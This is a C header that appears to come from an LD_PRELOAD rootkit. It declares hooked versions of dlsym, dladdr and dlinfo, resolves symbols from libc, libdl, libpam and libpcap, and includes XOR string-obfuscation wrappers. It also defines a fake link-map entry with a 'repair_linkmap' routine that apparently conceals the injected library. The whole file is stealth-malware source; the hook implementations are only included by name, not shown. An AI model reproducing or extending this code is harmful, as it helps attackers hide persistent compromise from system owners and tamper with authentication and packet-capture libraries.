#ifndef LIBDL_H
#define LIBDL_H

#include "util/xor.c"

#define LIBC_PATH    "libc.so.6"
#define LIBDL_PATH   "libdl.so.1"
#define LIBPAM_PATH  "libpam.so.0"
#define LIBPCAP_PATH "libpcap.so"

#define GLIBC_VER_STR    "GLIBC_2.%d"
#define GLIBC_VERVER_STR "GLIBC_2.%d.%d"
#define GLIBC_MAX_VER 40

#define FAKE_LINKMAP_NAME "(filo)"

extern void *_dl_sym(void *, const char *, void *);
typeof(dlsym) *o_dlsym;

static void get_libc_symbol(const char *symbol, void **funcptr);
static void get_libdl_symbol(const char *symbol, void **funcptr);
static void get_libpam_symbol(const char *symbol, void **funcptr);
static void get_libpcap_symbol(const char *symbol, void **funcptr);

static void locate_dlsym(void);
void *dlsym(void *handle, const char *symbol);

static void get_symbol_pointer(int symbol_index, void *handle);
static void _hook(void *handle, ...);
#include "gsym.c"

static int xfnmatch(const char *pattern, const char *string);
static char *xstrstr(const char *pattern, const char *string);
static int xstrncmp(const char *string, const char *pattern);
static int xprintf(const char *string);
static size_t xfwrite(const char *str, size_t nmemb, FILE *stream);
static FILE *xfopen(const char *path, const char *mode);
static void *xdlsym(void *handle, const char *symbol);
#define hook(...) _hook(RTLD_NEXT, __VA_ARGS__)
#define call(symbol_index, ...) symbols[symbol_index].func(__VA_ARGS__)
#include "util/xor_wrappers.h"
#include "dlsym.c"

int dladdr(const void *addr, Dl_info *info);
#include "dladdr.c"

static void repair_linkmap(void);
int dlinfo(void *handle, int request, void *p);
#include "dlinfo.c"

#endif
